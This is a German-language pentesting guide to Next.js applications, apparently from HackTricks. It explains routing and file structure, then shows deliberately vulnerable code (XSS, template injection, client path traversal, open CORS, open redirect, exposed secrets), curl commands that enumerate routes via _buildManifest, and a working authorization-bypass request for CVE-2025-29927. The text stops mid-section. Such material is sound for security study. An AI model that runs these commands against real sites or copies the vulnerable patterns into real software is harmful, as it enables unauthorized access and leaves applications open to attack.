# NextJS

{{#include ../../banners/hacktricks-training.md}}

## Allgemeine Architektur einer Next.js-Anwendung

### Typische Dateistruktur

Ein Standard-Next.js-Projekt folgt einer spezifischen Datei- und Verzeichnisstruktur, die Funktionen wie Routing, API-Endpunkte und die Verwaltung statischer Assets unterstützt. Hier ist ein typisches Layout:
```lua
my-nextjs-app/
├── node_modules/
├── public/
│   ├── images/
│   │   └── logo.png
│   └── favicon.ico
├── app/
│   ├── api/
│   │   └── hello/
│   │       └── route.ts
│   ├── layout.tsx
│   ├── page.tsx
│   ├── about/
│   │   └── page.tsx
│   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/
│   │   ├── Header.tsx
│   │   └── Footer.tsx
│   ├── styles/
│   │   ├── globals.css
│   │   └── Home.module.css
│   └── utils/
│       └── api.ts
├── .env.local
├── next.config.js
├── tsconfig.json
├── package.json
├── README.md
└── yarn.lock / package-lock.json

```
### Kernverzeichnisse und Dateien

- **public/:** Enthält statische Ressourcen wie Bilder, Schriftarten und andere Dateien. Dateien hier sind unter dem Root-Pfad (`/`) erreichbar.
- **app/:** Zentrales Verzeichnis für die Seiten, Layouts, Komponenten und API-Routen der Anwendung. Nutzt das **App Router**-Paradigma und ermöglicht erweiterte Routing-Features sowie die Trennung von Server- und Client-Komponenten.
- **app/layout.tsx:** Definiert das Root-Layout der Anwendung, umschließt alle Seiten und stellt konsistente UI-Elemente wie Header, Footer und Navigationsleisten bereit.
- **app/page.tsx:** Dient als Einstiegspunkt für die Root-Route `/` und rendert die Startseite.
- **app/[route]/page.tsx:** Behandelt statische und dynamische Routen. Jeder Ordner innerhalb von `app/` repräsentiert ein Routensegment, und die jeweilige `page.tsx` in diesen Ordnern entspricht der Komponente für diese Route.
- **app/api/:** Enthält API-Routen, die es ermöglichen, serverless Funktionen zu erstellen, die HTTP-Anfragen verarbeiten. Diese Routen ersetzen das traditionelle `pages/api`-Verzeichnis.
- **app/components/:** Beinhaltet wiederverwendbare React-Komponenten, die in verschiedenen Seiten und Layouts verwendet werden können.
- **app/styles/:** Enthält globale CSS-Dateien und CSS-Module für komponentenspezifisches Styling.
- **app/utils/:** Enthält Utility-Funktionen, Hilfsmodule und andere nicht-UI-Logik, die in der Anwendung geteilt werden können.
- **.env.local:** Speichert Umgebungsvariablen, die für die lokale Entwicklungsumgebung spezifisch sind. Diese Variablen werden **nicht** in die Versionskontrolle übernommen.
- **next.config.js:** Passt das Verhalten von Next.js an, inklusive webpack-Konfigurationen, Umgebungsvariablen und Sicherheitseinstellungen.
- **tsconfig.json:** Konfiguriert TypeScript-Einstellungen für das Projekt und ermöglicht Type-Checking sowie andere TypeScript-Funktionen.
- **package.json:** Verwaltet Projektabhängigkeiten, Skripte und Metadaten.
- **README.md:** Enthält Dokumentation und Informationen zum Projekt, einschließlich Setup-Anweisungen, Nutzungshinweisen und weiteren relevanten Details.
- **yarn.lock / package-lock.json:** Sperren die Abhängigkeiten des Projekts auf bestimmte Versionen, um konsistente Installationen in verschiedenen Umgebungen sicherzustellen.

## Client-seitig in Next.js

### Dateibasiertes Routing im `app`-Verzeichnis

Das `app`-Verzeichnis ist der Eckpfeiler des Routings in den aktuellen Next.js-Versionen. Es nutzt das Dateisystem zur Definition von Routen, wodurch das Routen-Management intuitiv und skalierbar wird.

<details>

<summary>Umgang mit dem Root-Pfad /</summary>

**Dateistruktur:**
```arduino
my-nextjs-app/
├── app/
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Wichtige Dateien:**

- **`app/page.tsx`**: Behandelt Anfragen an den Stammpfad `/`.
- **`app/layout.tsx`**: Definiert das Layout der Anwendung und umschließt alle Seiten.

**Implementierung:**
```tsx
tsxCopy code// app/page.tsx

export default function HomePage() {
return (
<div>
<h1>Welcome to the Home Page!</h1>
<p>This is the root route.</p>
</div>
);
}
```
**Erklärung:**

- **Routen-Definition:** Die `page.tsx` Datei direkt unter dem `app` Verzeichnis entspricht der `/` Route.
- **Darstellung:** Diese Komponente stellt den Inhalt der Startseite dar.
- **Layout-Integration:** Die `HomePage` Komponente wird von `layout.tsx` umschlossen, welches Header, Footer und andere gemeinsame Elemente enthalten kann.

</details>

<details>

<summary>Umgang mit anderen statischen Pfaden</summary>

**Beispiel: `/about` Route**

**Dateistruktur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── about/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementierung:**
```tsx
// app/about/page.tsx

export default function AboutPage() {
return (
<div>
<h1>About Us</h1>
<p>Learn more about our mission and values.</p>
</div>
)
}
```
**Erklärung:**

- **Routen-Definition:** Die Datei `page.tsx` im Ordner `about` entspricht der Route `/about`.
- **Rendering:** Diese Komponente rendert den Inhalt der `/about`-Seite.

</details>

<details>

<summary>Dynamische Routen</summary>

Dynamische Routen ermöglichen das Verarbeiten von Pfaden mit variablen Segmenten und erlauben es Anwendungen, Inhalte basierend auf Parametern wie IDs, slugs usw. anzuzeigen.

**Beispiel: `/posts/[id]` Route**

**Dateistruktur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── posts/
│   │   └── [id]/
│   │       └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementierung:**
```tsx
tsxCopy code// app/posts/[id]/page.tsx

import { useRouter } from 'next/navigation';

interface PostProps {
params: { id: string };
}

export default function PostPage({ params }: PostProps) {
const { id } = params;
// Fetch post data based on 'id'

return (
<div>
<h1>Post #{id}</h1>
<p>This is the content of post {id}.</p>
</div>
);
}
```
**Erläuterung:**

- **Dynamisches Segment:** `[id]` steht für ein dynamisches Segment in der Route und erfasst den `id`-Parameter aus der URL.
- **Zugriff auf Parameter:** Das `params`-Objekt enthält die dynamischen Parameter und ist innerhalb der Komponente zugänglich.
- **Route-Matching:** Jeder Pfad, der `/posts/*` entspricht, wie z. B. `/posts/1`, `/posts/abc` usw., wird von dieser Komponente verarbeitet.

</details>

<details>

<summary>Verschachtelte Routen</summary>

Next.js unterstützt verschachtelte Routen und ermöglicht hierarchische Routestrukturen, die die Verzeichnisstruktur widerspiegeln.

**Beispiel: `/dashboard/settings/profile` Route**

**Dateistruktur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── dashboard/
│   │   ├── settings/
│   │   │   └── profile/
│   │   │       └── page.tsx
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementierung:**
```tsx
tsxCopy code// app/dashboard/settings/profile/page.tsx

export default function ProfileSettingsPage() {
return (
<div>
<h1>Profile Settings</h1>
<p>Manage your profile information here.</p>
</div>
);
}
```
**Erklärung:**

- **Tiefe Verschachtelung:** Die Datei `page.tsx` innerhalb von `dashboard/settings/profile/` entspricht der Route `/dashboard/settings/profile`.
- **Hierarchieabbildung:** Die Verzeichnisstruktur spiegelt den URL-Pfad wider und verbessert die Wartbarkeit und Übersichtlichkeit.

</details>

<details>

<summary>Catch-All-Routen</summary>

Catch-All-Routen behandeln mehrere verschachtelte Segmente oder unbekannte Pfade und bieten Flexibilität bei der Routenverarbeitung.

**Beispiel: `/*` Route**

**Dateistruktur:**
```arduino
my-nextjs-app/
├── app/
│   ├── [...slug]/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementierung:**
```tsx
// app/[...slug]/page.tsx

interface CatchAllProps {
params: { slug: string[] }
}

export default function CatchAllPage({ params }: CatchAllProps) {
const { slug } = params
const fullPath = `/${slug.join("/")}`

return (
<div>
<h1>Catch-All Route</h1>
<p>You have navigated to: {fullPath}</p>
</div>
)
}
```
**Erklärung:**

- **Catch-All-Segment:** `[...slug]` erfasst alle verbleibenden Pfadsegmente als Array.
- **Verwendung:** Nützlich zur Handhabung dynamischer Routing-Szenarien wie benutzergenerierte Pfade, verschachtelte Kategorien usw.
- **Routenabgleich:** Pfade wie `/anything/here`, `/foo/bar/baz` usw. werden von dieser Komponente behandelt.

</details>

### Potenzielle clientseitige Schwachstellen

Obwohl Next.js eine sichere Grundlage bietet, können unsachgemäße Programmierpraktiken Schwachstellen einführen. Wichtige clientseitige Schwachstellen sind:

<details>

<summary>Cross-Site Scripting (XSS)</summary>

XSS-Angriffe treten auf, wenn bösartige Skripte in vertrauenswürdige Websites eingeschleust werden. Angreifer können Skripte im Browser der Nutzer ausführen, Daten stehlen oder Aktionen im Namen des Nutzers durchführen.

**Beispiel für anfälligen Code:**
```jsx
// Dangerous: Injecting user input directly into HTML
function Comment({ userInput }) {
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
}
```
**Warum es verwundbar ist:** Die Verwendung von `dangerouslySetInnerHTML` mit nicht vertrauenswürdigen Eingaben erlaubt es Angreifern, bösartige Skripte einzuschleusen.

</details>

<details>

<summary>Client-Side Template Injection</summary>

Tritt auf, wenn Benutzereingaben in Templates unsachgemäß verarbeitet werden, wodurch Angreifer Templates oder Ausdrücke injizieren und ausführen können.

**Beispiel für verwundbaren Code:**
```jsx
import React from "react"
import ejs from "ejs"

function RenderTemplate({ template, data }) {
const html = ejs.render(template, data)
return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```
**Warum es verwundbar ist:** Wenn `template` oder `data` bösartigen Inhalt enthält, kann dies zur Ausführung von unerwünschtem Code führen.

</details>

<details>

<summary>Client Path Traversal</summary>

Es handelt sich um eine Schwachstelle, die es Angreifern erlaubt, client-side paths zu manipulieren, um unbeabsichtigte Aktionen durchzuführen, wie zum Beispiel Cross-Site Request Forgery (CSRF). Im Gegensatz zu server-side path traversal, das das Dateisystem des Servers angreift, konzentriert sich CSPT darauf, client-side mechanisms auszunutzen, um legitime API-Requests an bösartige Endpunkte umzuleiten.

**Example of Vulnerable Code:**

Eine Next.js-Anwendung erlaubt Nutzern, Dateien hoch- und herunterzuladen. Die Download-Funktion ist client-side implementiert, wobei Nutzer den Dateipfad angeben können, den sie herunterladen möchten.
```jsx
// pages/download.js
import { useState } from "react"

export default function DownloadPage() {
const [filePath, setFilePath] = useState("")

const handleDownload = () => {
fetch(`/api/files/${filePath}`)
.then((response) => response.blob())
.then((blob) => {
const url = window.URL.createObjectURL(blob)
const a = document.createElement("a")
a.href = url
a.download = filePath
a.click()
})
}

return (
<div>
<h1>Download File</h1>
<input
type="text"
value={filePath}
onChange={(e) => setFilePath(e.target.value)}
placeholder="Enter file path"
/>
<button onClick={handleDownload}>Download</button>
</div>
)
}
```
#### Angriffsszenario

1. **Ziel des Angreifers**: Führe einen CSRF-Angriff durch, um eine kritische Datei (z. B. `admin/config.json`) zu löschen, indem der `filePath` manipuliert wird.
2. **Ausnutzen von CSPT**:
- **Malicious Input**: Der Angreifer erstellt eine URL mit einem manipulierten `filePath`, z. B. `../deleteFile/config.json`.
- **Resultierender API-Aufruf**: Der clientseitige Code macht eine Anfrage an `/api/files/../deleteFile/config.json`.
- **Serververarbeitung**: Wenn der Server den `filePath` nicht validiert, verarbeitet er die Anfrage und löscht oder legt möglicherweise sensible Dateien offen.
3. **Durchführung von CSRF**:
- **Crafted Link**: Der Angreifer sendet dem Opfer einen Link oder bettet ein bösartiges Script ein, das die Download-Anfrage mit dem manipulierten `filePath` auslöst.
- **Ergebnis**: Das Opfer führt die Aktion unwissentlich aus, was zu unautorisiertem Datei-Zugriff oder -Löschung führt.

</details>

### Recon: static export route discovery via _buildManifest

When `nextExport`/`autoExport` are true (static export), Next.js exposes the `buildId` in the HTML and serves a build manifest at `/_next/static/<buildId>/_buildManifest.js`. The `sortedPages` array and route→chunk mapping there enumerate every prerendered page without brute force.

- Grab the buildId from the root response (often printed at the bottom) or from `<script>` tags loading `/_next/static/<buildId>/...`.
- Fetch the manifest and extract routes:
```bash
build=$(curl -s http://target/ | grep -oE '"buildId":"[^"]+"' | cut -d: -f2 | tr -d '"')
curl -s "http://target/_next/static/${build}/_buildManifest.js" | grep -oE '"(/[a-zA-Z0-9_\[\]\-/]+)"' | tr -d '"'
```
- Verwende die entdeckten Pfade (zum Beispiel `/docs`, `/docs/content/examples`, `/signin`), um auth testing und endpoint discovery voranzutreiben.

## Server-seitig in Next.js

### Server-seitiges Rendering (SSR)

Seiten werden bei jeder Anfrage auf dem Server gerendert, sodass der Benutzer vollständig gerendertes HTML erhält. In diesem Fall solltest du einen eigenen benutzerdefinierten Server erstellen, um die Anfragen zu verarbeiten.

**Anwendungsfälle:**

- Dynamische Inhalte, die sich häufig ändern.
- SEO-Optimierung, da Suchmaschinen die vollständig gerenderte Seite crawlen können.

**Implementierung:**
```jsx
// pages/index.js
export async function getServerSideProps(context) {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data } }
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Statische Site-Generierung (SSG)

Seiten werden zur Build-Zeit vorgerendert, was zu schnelleren Ladezeiten und reduzierter Serverlast führt.

**Anwendungsfälle:**

- Inhalte, die sich nicht häufig ändern.
- Blogs, Dokumentation, Marketing-Seiten.

**Implementierung:**
```jsx
// pages/index.js
export async function getStaticProps() {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data }, revalidate: 60 } // Revalidate every 60 seconds
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Serverless Functions (API Routes)

Next.js ermöglicht das Erstellen von API-Endpunkten als Serverless-Funktionen. Diese Funktionen laufen on-demand, ohne dass ein dedizierter Server erforderlich ist.

**Anwendungsfälle:**

- Verarbeitung von Formularen.
- Interaktion mit Datenbanken.
- Datenverarbeitung oder Integration mit Drittanbieter-APIs.

**Implementierung:**

Mit der Einführung des `app` directory in Next.js 13 sind Routing und API-Handling flexibler und leistungsfähiger geworden. Dieser moderne Ansatz steht in engem Einklang mit dem file-based routing System, bringt aber erweiterte Möglichkeiten mit sich, einschließlich Unterstützung für Server- und Client-Komponenten.

#### Grundlegender Route-Handler

**Dateistruktur:**
```go
my-nextjs-app/
├── app/
│   └── api/
│       └── hello/
│           └── route.js
├── package.json
└── ...
```
**Implementierung:**
```javascript
// app/api/hello/route.js

export async function POST(request) {
return new Response(JSON.stringify({ message: "Hello from App Router!" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

// Client-side fetch to access the API endpoint
fetch("/api/submit", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ name: "John Doe" }),
})
.then((res) => res.json())
.then((data) => console.log(data))
```
**Erklärung:**

- **Ort:** API-Routen befinden sich im Verzeichnis `app/api/`.
- **Dateibenennung:** Jeder API-Endpunkt befindet sich in einem eigenen Ordner, der eine `route.js`- oder `route.ts`-Datei enthält.
- **Exportierte Funktionen:** Anstelle eines einzelnen default-Exports werden spezifische HTTP-Methodenfunktionen (z. B. `GET`, `POST`) exportiert.
- **Response Handling:** Verwende den `Response`-Konstruktor, um Responses zurückzugeben; das ermöglicht mehr Kontrolle über Header und Statuscodes.

#### Umgang mit anderen Pfaden und Methoden:

<details>

<summary>Spezifische HTTP-Methoden handhaben</summary>

Next.js 13+ erlaubt es, Handler für spezifische HTTP-Methoden in derselben `route.js`- oder `route.ts`-Datei zu definieren, was zu klarerem und besser organisiertem Code führt.

**Beispiel:**
```javascript
// app/api/users/[id]/route.js

export async function GET(request, { params }) {
const { id } = params
// Fetch user data based on 'id'
return new Response(JSON.stringify({ userId: id, name: "Jane Doe" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function PUT(request, { params }) {
const { id } = params
// Update user data based on 'id'
return new Response(JSON.stringify({ message: `User ${id} updated.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function DELETE(request, { params }) {
const { id } = params
// Delete user based on 'id'
return new Response(JSON.stringify({ message: `User ${id} deleted.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Erklärung:**

- **Mehrere Exporte:** Jede HTTP-Methode (`GET`, `PUT`, `DELETE`) hat ihre eigene exportierte Funktion.
- **Parameter:** Das zweite Argument bietet Zugriff auf Routenparameter über `params`.
- **Erweiterte Antworten:** Größere Kontrolle über Antwortobjekte, wodurch eine präzise Verwaltung von Headern und Statuscodes ermöglicht wird.

</details>

<details>

<summary>Catch-All- und verschachtelte Routen</summary>

Next.js 13+ unterstützt erweiterte Routing-Features wie catch-all-Routen und verschachtelte API-Routen, was dynamischere und skalierbarere API-Strukturen ermöglicht.

**Beispiel für eine Catch-All-Route:**
```javascript
// app/api/[...slug]/route.js

export async function GET(request, { params }) {
const { slug } = params
// Handle dynamic nested routes
return new Response(JSON.stringify({ slug }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Erklärung:**

- **Syntax:** `[...]` kennzeichnet ein Catch-all-Segment, das alle verschachtelten Pfade erfasst.
- **Verwendung:** Nützlich für APIs, die unterschiedliche Routen-Tiefen oder dynamische Segmente verarbeiten müssen.

**Beispiel für verschachtelte Routen:**
```javascript
// app/api/posts/[postId]/comments/[commentId]/route.js

export async function GET(request, { params }) {
const { postId, commentId } = params
// Fetch specific comment for a post
return new Response(
JSON.stringify({ postId, commentId, comment: "Great post!" }),
{
status: 200,
headers: { "Content-Type": "application/json" },
}
)
}
```
**Erklärung:**

- **Tiefe Verschachtelung:** Ermöglicht hierarchische API-Strukturen, die Ressourcenbeziehungen widerspiegeln.
- **Parameterzugriff:** Ermöglicht einfachen Zugriff auf mehrere Routenparameter über das `params`-Objekt.

</details>

<details>

<summary>Umgang mit API-Routen in Next.js 12 und früher</summary>

## API-Routen im Verzeichnis `pages` (Next.js 12 und früher)

Bevor Next.js 13 das `app`-Verzeichnis und erweiterte Routing-Funktionen einführte, wurden API-Routen hauptsächlich im Verzeichnis `pages` definiert. Dieser Ansatz wird weiterhin häufig verwendet und in Next.js 12 und früheren Versionen unterstützt.

#### Grundlegende API-Route

**Dateistruktur:**
```go
goCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── hello.js
├── package.json
└── ...
```
**Implementierung:**
```javascript
javascriptCopy code// pages/api/hello.js

export default function handler(req, res) {
res.status(200).json({ message: 'Hello, World!' });
}
```
**Erklärung:**

- **Speicherort:** API-Routen befinden sich im Verzeichnis `pages/api/`.
- **Export:** Verwende `export default`, um die Handler-Funktion zu definieren.
- **Funktionssignatur:** Der Handler erhält die Objekte `req` (HTTP-Anfrage) und `res` (HTTP-Antwort).
- **Routing:** Der Dateiname (`hello.js`) bildet den Endpoint `/api/hello`.

#### Dynamische API-Routen

**Dateistruktur:**
```bash
bashCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── users/
│           └── [id].js
├── package.json
└── ...
```
**Implementierung:**
```javascript
javascriptCopy code// pages/api/users/[id].js

export default function handler(req, res) {
const {
query: { id },
method,
} = req;

switch (method) {
case 'GET':
// Fetch user data based on 'id'
res.status(200).json({ userId: id, name: 'John Doe' });
break;
case 'PUT':
// Update user data based on 'id'
res.status(200).json({ message: `User ${id} updated.` });
break;
case 'DELETE':
// Delete user based on 'id'
res.status(200).json({ message: `User ${id} deleted.` });
break;
default:
res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Erklärung:**

- **Dynamische Segmente:** Eckige Klammern (`[id].js`) kennzeichnen dynamische Routen-Segmente.
- **Zugriff auf Parameter:** Verwende `req.query.id`, um auf den dynamischen Parameter zuzugreifen.
- **Umgang mit Methoden:** Verwende bedingte Logik, um verschiedene HTTP-Methoden (`GET`, `PUT`, `DELETE`, etc.) zu behandeln.

#### Umgang mit verschiedenen HTTP-Methoden

Während das grundlegende API-Route-Beispiel alle HTTP-Methoden in einer einzigen Funktion behandelt, kannst du deinen Code so strukturieren, dass jede Methode explizit behandelt wird, um bessere Übersichtlichkeit und Wartbarkeit zu erreichen.

**Beispiel:**
```javascript
javascriptCopy code// pages/api/posts.js

export default async function handler(req, res) {
const { method } = req;

switch (method) {
case 'GET':
// Handle GET request
res.status(200).json({ message: 'Fetching posts.' });
break;
case 'POST':
// Handle POST request
res.status(201).json({ message: 'Post created.' });
break;
default:
res.setHeader('Allow', ['GET', 'POST']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Beste Vorgehensweisen:**

- **Trennung der Verantwortlichkeiten:** Trennen Sie die Logik für verschiedene HTTP-Methoden klar voneinander.
- **Antwortkonsistenz:** Stellen Sie konsistente Antwortstrukturen sicher, um die clientseitige Verarbeitung zu erleichtern.
- **Fehlerbehandlung:** Behandeln Sie nicht unterstützte Methoden und unerwartete Fehler zuverlässig.

</details>

### CORS-Konfiguration

Steuern Sie, welche Ursprünge auf Ihre API-Routen zugreifen können, um Cross-Origin Resource Sharing (CORS)-Schwachstellen zu mindern.

**Schlechtes Konfigurationsbeispiel:**
```javascript
// app/api/data/route.js

export async function GET(request) {
return new Response(JSON.stringify({ data: "Public Data" }), {
status: 200,
headers: {
"Access-Control-Allow-Origin": "*", // Allows any origin
"Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
},
})
}
```
Beachte, dass **CORS auch in allen API-Routen konfiguriert werden kann** innerhalb der **`middleware.ts`**-Datei:
```javascript
// app/middleware.ts

import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(request: NextRequest) {
const allowedOrigins = [
"https://yourdomain.com",
"https://sub.yourdomain.com",
]
const origin = request.headers.get("Origin")

const response = NextResponse.next()

if (allowedOrigins.includes(origin || "")) {
response.headers.set("Access-Control-Allow-Origin", origin || "")
response.headers.set(
"Access-Control-Allow-Methods",
"GET, POST, PUT, DELETE, OPTIONS"
)
response.headers.set(
"Access-Control-Allow-Headers",
"Content-Type, Authorization"
)
// If credentials are needed:
// response.headers.set('Access-Control-Allow-Credentials', 'true');
}

// Handle preflight requests
if (request.method === "OPTIONS") {
return new Response(null, {
status: 204,
headers: response.headers,
})
}

return response
}

export const config = {
matcher: "/api/:path*", // Apply to all API routes
}
```
**Problem:**

- **`Access-Control-Allow-Origin: '*'`:** Erlaubt jeder Website, auf die API zuzugreifen, wodurch bösartige Seiten möglicherweise ohne Einschränkungen mit deiner API interagieren können.
- **Breite Methodenfreigabe:** Das Zulassen aller Methoden kann Angreifern ermöglichen, unerwünschte Aktionen durchzuführen.

**Wie Angreifer es ausnutzen:**

Angreifer können bösartige Websites erstellen, die Anfragen an deine API stellen und so Funktionen wie Datenabruf, Datenmanipulation oder das Auslösen unerwünschter Aktionen im Namen authentifizierter Benutzer missbrauchen können.


{{#ref}}
../../pentesting-web/cors-bypass.md
{{#endref}}

### Server-Code-Offenlegung auf der Client-Seite

Es kann leicht passieren, dass **Code, der auf dem Server verwendet wird, auch im Client offengelegt und verwendet wird**. Der beste Weg, um sicherzustellen, dass eine Datei mit Code niemals auf der Client-Seite offengelegt wird, ist, diesen Import am Anfang der Datei zu verwenden:
```js
import "server-only"
```
## Wichtige Dateien und ihre Rollen

### `middleware.ts` / `middleware.js`

**Ort:** Stammverzeichnis des Projekts oder innerhalb von `src/`.

**Zweck:** Führt Code in der serverseitigen serverlosen Funktion aus, bevor eine Anfrage verarbeitet wird, und ermöglicht Aufgaben wie Authentifizierung, Weiterleitungen oder das Anpassen von Antworten.

**Ablauf:**

1. **Eingehende Anfrage:** Die Middleware fängt die Anfrage ab.
2. **Verarbeitung:** Führt Operationen basierend auf der Anfrage aus (z. B. Authentifizierung prüfen).
3. **Antwortmodifikation:** Kann die Antwort ändern oder die Kontrolle an den nächsten Handler weitergeben.

**Beispielhafte Anwendungsfälle:**

- Weiterleitung von nicht authentifizierten Benutzern.
- Hinzufügen benutzerdefinierter Header.
- Protokollierung von Anfragen.

**Beispielkonfiguration:**
```typescript
// middleware.ts
import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(req: NextRequest) {
const url = req.nextUrl.clone()
if (!req.cookies.has("token")) {
url.pathname = "/login"
return NextResponse.redirect(url)
}
return NextResponse.next()
}

export const config = {
matcher: ["/protected/:path*"],
}
```
### Middleware authorization bypass (CVE-2025-29927)

Wenn Autorisierung in middleware erzwungen ist, können betroffene Next.js-Releases (<12.3.5 / 13.5.9 / 14.2.25 / 15.2.3) durch Injizieren des `x-middleware-subrequest` Headers umgangen werden. Das Framework überspringt die middleware-Rekursion und liefert die geschützte Seite zurück.

- Das Standardverhalten ist typischerweise ein 307-Redirect zu einer Login-Route wie `/api/auth/signin`.
- Sende einen langen `x-middleware-subrequest`-Wert (wiederhole `middleware`, um `MAX_RECURSION_DEPTH` zu erreichen), um die Antwort auf 200 zu setzen:
```bash
curl -i "http://target/docs" \
-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```
- Da authentifizierte Seiten viele Subressourcen laden, fügen Sie den Header zu jeder Anfrage hinzu (z. B. Burp Match/Replace mit einem leeren Match-String), damit Assets nicht umgeleitet werden.

### `next.config.js`

**Location:** Stammverzeichnis des Projekts.

**Purpose:** Konfiguriert das Verhalten von Next.js, aktiviert oder deaktiviert Features, passt webpack-Konfigurationen an, setzt Umgebungsvariablen und konfiguriert verschiedene Sicherheitsfunktionen.

**Key Security Configurations:**

<details>

<summary>Sicherheits-Header</summary>

Sicherheits-Header erhöhen die Sicherheit Ihrer Anwendung, indem sie Browser anweisen, wie Inhalte behandelt werden sollen. Sie helfen, verschiedene Angriffe wie Cross-Site Scripting (XSS), Clickjacking und MIME type sniffing zu mindern:

- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Referrer Policy

**Beispiele:**
```javascript
// next.config.js

module.exports = {
async headers() {
return [
{
source: "/(.*)", // Apply to all routes
headers: [
{
key: "X-Frame-Options",
value: "DENY",
},
{
key: "Content-Security-Policy",
value:
"default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';",
},
{
key: "X-Content-Type-Options",
value: "nosniff",
},
{
key: "Strict-Transport-Security",
value: "max-age=63072000; includeSubDomains; preload", // Enforces HTTPS
},
{
key: "Referrer-Policy",
value: "no-referrer", // Completely hides referrer
},
// Additional headers...
],
},
]
},
}
```
</details>

<details>

<summary>Einstellungen zur Bildoptimierung</summary>

Next.js optimiert Bilder für die Performance, aber Fehlkonfigurationen können zu Sicherheitslücken führen, z. B. indem nicht vertrauenswürdige Quellen bösartigen Inhalt einschleusen.

**Schlechtes Konfigurationsbeispiel:**
```javascript
// next.config.js

module.exports = {
images: {
domains: ["*"], // Allows images from any domain
},
}
```
**Problem:**

- **`'*'`:** Erlaubt das Laden von Bildern von jeder externen Quelle, einschließlich nicht vertrauenswürdiger oder bösartiger Domains. Angreifer können Bilder hosten, die bösartige payloads enthalten oder Benutzer in die Irre führen.
- Ein weiteres Problem kann das Zulassen einer Domain sein, **auf der jeder ein Bild hochladen kann** (wie `raw.githubusercontent.com`)

**Wie Angreifer es ausnutzen:**

Durch Einfügen von Bildern aus bösartigen Quellen können Angreifer Phishing-Angriffe durchführen, irreführende Informationen anzeigen oder Schwachstellen in Bibliotheken zur Bilddarstellung ausnutzen.

</details>

<details>

<summary>Offenlegung von Umgebungsvariablen</summary>

Verwalte sensible Informationen wie API keys und Datenbank-Zugangsdaten sicher, ohne sie dem Client offenzulegen.

#### a. Offenlegung sensibler Variablen

**Schlechtes Konfigurationsbeispiel:**
```javascript
// next.config.js

module.exports = {
env: {
SECRET_API_KEY: process.env.SECRET_API_KEY, // Exposed to the client
NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Correctly prefixed for client
},
}
```
**Problem:**

- **`SECRET_API_KEY`:** Ohne das `NEXT_PUBLIC_`-Präfix exponiert Next.js Variablen nicht an den Client. Wenn es jedoch versehentlich mit Präfix versehen wird (z. B. `NEXT_PUBLIC_SECRET_API_KEY`), wird es auf der Client-Seite zugänglich.

**Wie Angreifer es ausnutzen:**

Wenn sensible Variablen für den Client sichtbar sind, können Angreifer sie durch Inspektion des Client-Codes oder der Netzwerkrequests abrufen und sich unautorisierten Zugriff auf APIs, Datenbanken oder andere Dienste verschaffen.

</details>

<details>

<summary>Weiterleitungen</summary>

Verwalten Sie URL-Weiterleitungen und -Umschreibungen innerhalb Ihrer Anwendung, um sicherzustellen, dass Benutzer angemessen weitergeleitet werden, ohne open redirect vulnerabilities einzuführen.

#### a. Open Redirect Vulnerability

**Schlechtes Konfigurationsbeispiel:**
```javascript
// next.config.js

module.exports = {
async redirects() {
return [
{
source: "/redirect",
destination: (req) => req.query.url, // Dynamically redirects based on query parameter
permanent: false,
},
]
},
}
```
**Problem:**

- **Dynamisches Ziel:** Ermöglicht es Benutzern, beliebige URLs anzugeben, wodurch open redirect attacks möglich werden.
- **Vertrauen auf Benutzereingaben:** Weiterleitungen zu von Benutzern angegebenen URLs ohne Validierung können zu phishing, malware distribution oder credential theft führen.

**Wie Angreifer das ausnutzen:**

Angreifer können URLs erstellen, die so aussehen, als kämen sie von Ihrer Domain, aber Benutzer zu bösartigen Seiten weiterleiten. Zum Beispiel:
```bash
https://yourdomain.com/redirect?url=https://malicious-site.com
```
Benutzer, die der ursprünglichen Domain vertrauen, könnten unwissentlich auf schädliche Websites weitergeleitet werden.

</details>

<details>

<summary>Webpack-Konfiguration</summary>

Passe Webpack-Konfigurationen für Ihre Next.js-Anwendung an, die unbeabsichtigt Sicherheitslücken einführen können, wenn sie nicht vorsichtig behandelt werden.

#### a. Offenlegung sensibler Module

**Schlechtes Konfigurationsbeispiel:**
```javascript
// next.config.js

module.exports = {
webpack: (config, { isServer }) => {
if (!isServer) {
config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")
}
return config
},
}
```
**Problem:**

